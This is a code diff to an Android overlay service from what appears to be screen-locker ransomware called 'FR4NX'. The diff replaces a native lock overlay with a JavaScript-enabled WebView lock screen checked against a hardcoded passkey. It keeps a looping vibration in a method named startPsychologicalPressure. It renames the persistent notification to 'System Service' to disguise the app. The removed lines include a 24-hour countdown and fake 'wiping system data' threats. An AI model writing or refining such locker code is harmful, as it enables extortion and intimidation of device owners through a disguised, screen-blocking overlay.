@@ -10,27 +10,17 @@ import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.os.Build;
-import android.os.CountDownTimer;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.os.SystemClock;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.Settings;
 import android.util.Base64;
 import android.view.Gravity;
-import android.view.LayoutInflater;
-import android.view.MotionEvent;
-import android.view.View;
 import android.view.WindowManager;
-import android.view.inputmethod.EditorInfo;
-import android.view.inputmethod.InputMethodManager;
-import android.widget.Button;
-import android.widget.EditText;
-import android.widget.FrameLayout;
-import android.widget.ProgressBar;
-import android.widget.TextView;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -42,24 +32,9 @@ public class OverlayService extends Service {
 
     private WindowManager windowManager;
     private WindowManager.LayoutParams windowParams;
-    private View overlay;
-    private FrameLayout rootView;
-    
-    private EditText authInput;
-    private Button authButton;
-    private TextView countdownTimer;
-    private TextView statusText;
-    private ProgressBar actionProgressBar;
-
-    private int tapCount = 0;
-    private long firstTapTime = 0L;
+    private WebView lockWebView;
     private boolean overlayAttached = false;
-    private boolean authVisible = false;
-    private boolean shuttingDown = false;
-
-    private CountDownTimer timer;
     private Vibrator vibrator;
-    private Handler handler = new Handler(Looper.getMainLooper());
 
     @Override
     public void onCreate() {
@@ -70,7 +45,7 @@ public class OverlayService extends Service {
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
             ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
             startForeground(NOTIFICATION_ID, new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("FR4NX")
+                    .setContentTitle("System Service")
                     .setSmallIcon(android.R.drawable.ic_lock_lock)
                     .build());
         }
@@ -112,58 +87,20 @@ public class OverlayService extends Service {
         windowParams.gravity = Gravity.TOP | Gravity.START;
         windowParams.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
 
-        overlay = LayoutInflater.from(this).inflate(R.layout.overlay_lock, null);
-        rootView = (FrameLayout) overlay;
+        lockWebView = new WebView(this);
+        lockWebView.getSettings().setJavaScriptEnabled(true);
+        lockWebView.getSettings().setDomStorageEnabled(true);
+        lockWebView.setBackgroundColor(0xFF05030A); // Match HTML background
+        lockWebView.setWebViewClient(new WebViewClient());
         
-        authInput = overlay.findViewById(R.id.authInput);
-        authButton = overlay.findViewById(R.id.authButton);
-        countdownTimer = overlay.findViewById(R.id.countdownTimer);
-        statusText = overlay.findViewById(R.id.statusText);
-        actionProgressBar = overlay.findViewById(R.id.actionProgressBar);
-
-        if (authInput != null) authInput.setVisibility(View.GONE);
-        if (authButton != null) authButton.setVisibility(View.GONE);
-
-        if (authButton != null && authInput != null) {
-            authButton.setOnClickListener(v -> authenticateUser());
-        }
-        if (authInput != null) {
-            authInput.setSingleLine(true);
-            authInput.setImeOptions(EditorInfo.IME_ACTION_DONE);
-            authInput.setOnEditorActionListener((view, actionId, event) -> {
-                if (actionId == EditorInfo.IME_ACTION_DONE) {
-                    authenticateUser();
-                    return true;
-                }
-                return false;
-            });
-        }
-
-        rootView.setOnTouchListener((view, event) -> {
-            if (authVisible) return false;
-            if (event.getAction() != MotionEvent.ACTION_UP) return false;
-            float x = event.getX();
-            float y = event.getY();
-            if (!(x >= 0 && x <= 150f && y >= 0 && y <= 150f)) {
-                tapCount = 0;
-                return false;
-            }
-            long currentTime = SystemClock.elapsedRealtime();
-            if (tapCount == 0 || currentTime - firstTapTime > 3000L) {
-                tapCount = 1;
-                firstTapTime = currentTime;
-            } else {
-                tapCount++;
-            }
-            if (tapCount >= 5) {
-                tapCount = 0;
-                revealAuthentication();
-            }
-            return false;
-        });
+        // Add the bridge so JS can call Android.verifyPasskey()
+        lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
+        
+        // Load the lock screen HTML
+        lockWebView.loadUrl("file:///android_asset/lock_screen.html");
 
         try {
-            windowManager.addView(overlay, windowParams);
+            windowManager.addView(lockWebView, windowParams);
             overlayAttached = true;
         } catch (Exception e) {
             stopSelf();
@@ -171,7 +108,6 @@ public class OverlayService extends Service {
     }
 
     private void startPsychologicalPressure() {
-        // 1. Vibration Loop
         vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
         if (vibrator != null && vibrator.hasVibrator()) {
             long[] pattern = {0, 1000, 1000};
@@ -181,99 +117,27 @@ public class OverlayService extends Service {
                 vibrator.vibrate(pattern, 0);
             }
         }
-
-        // 2. Countdown Timer
-        timer = new CountDownTimer(24 * 60 * 60 * 1000L, 1000) {
-            @Override
-            public void onTick(long millisUntilFinished) {
-                int hours = (int) (millisUntilFinished / (1000 * 60 * 60));
-                int minutes = (int) ((millisUntilFinished / (1000 * 60)) % 60);
-                int seconds = (int) (millisUntilFinished / 1000) % 60;
-                String time = String.format("%02d:%02d:%02d", hours, minutes, seconds);
-                if (countdownTimer != null) countdownTimer.setText(time);
-            }
-
-            @Override
-            public void onFinish() {
-                if (countdownTimer != null) countdownTimer.setText("SYSTEM DATA DESTROYED");
-            }
-        }.start();
     }
 
-    private void revealAuthentication() {
-        if (authVisible || authInput == null || authButton == null) return;
-        authVisible = true;
-        authInput.setVisibility(View.VISIBLE);
-        authButton.setVisibility(View.VISIBLE);
-        authInput.requestFocus();
-        authInput.post(() -> {
-            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
-            if (imm != null) imm.showSoftInput(authInput, InputMethodManager.SHOW_IMPLICIT);
-        });
-    }
-
-    private void authenticateUser() {
-        if (shuttingDown || authInput == null) return;
-        String pass = authInput.getText().toString().trim();
-        
-        authInput.setVisibility(View.GONE);
-        authButton.setVisibility(View.GONE);
-        statusText.setVisibility(View.VISIBLE);
-        actionProgressBar.setVisibility(View.VISIBLE);
-        actionProgressBar.setProgress(0);
-
+    // Called from Javascript via LockWebInterface
+    public void authenticateUser(String pass) {
         if ("FR4NX".equals(pass)) {
-            shuttingDown = true;
-            statusText.setTextColor(0xFF00FF00);
-            statusText.setText("DECRYPTING SYSTEM FILES...");
-            
-            handler.post(new Runnable() {
-                int progress = 0;
-                @Override
-                public void run() {
-                    if (progress <= 100) {
-                        actionProgressBar.setProgress(progress);
-                        progress += 5;
-                        handler.postDelayed(this, 500);
-                    } else {
-                        unlockOverlay();
-                    }
-                }
-            });
+            lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
         } else {
-            statusText.setTextColor(0xFFFF0000);
-            statusText.setText("WARNING: WIPING SYSTEM DATA...");
-            
-            handler.post(new Runnable() {
-                int progress = 0;
-                @Override
-                public void run() {
-                    if (progress <= 100) {
-                        actionProgressBar.setProgress(progress);
-                        progress += 10;
-                        handler.postDelayed(this, 500);
-                    } else {
-                        statusText.setVisibility(View.GONE);
-                        actionProgressBar.setVisibility(View.GONE);
-                        authInput.setVisibility(View.VISIBLE);
-                        authButton.setVisibility(View.VISIBLE);
-                        authInput.setText("");
-                    }
-                }
-            });
+            lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
         }
     }
 
-    private void unlockOverlay() {
-        shuttingDown = true;
-        if (timer != null) timer.cancel();
+    public void unlockOverlay() {
         if (vibrator != null) vibrator.cancel();
-        handler.removeCallbacksAndMessages(null);
-
+        
         getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).apply();
 
-        if (overlayAttached && overlay != null) {
-            try { windowManager.removeView(overlay); } catch (Exception ignored) {}
+        if (overlayAttached && lockWebView != null) {
+            try {
+                windowManager.removeView(lockWebView);
+                lockWebView.destroy();
+            } catch (Exception ignored) {}
             overlayAttached = false;
         }
         stopForeground(true);
@@ -307,12 +171,9 @@ public class OverlayService extends Service {
 
     @Override
     public void onDestroy() {
-        if (timer != null) timer.cancel();
         if (vibrator != null) vibrator.cancel();
-        handler.removeCallbacksAndMessages(null);
-        
-        if (overlayAttached && overlay != null) {
-            try { windowManager.removeView(overlay); } catch (Exception ignored) {}
+        if (overlayAttached && lockWebView != null) {
+            try { windowManager.removeView(lockWebView); } catch (Exception ignored) {}
         }
         stopForeground(true);
         super.onDestroy();
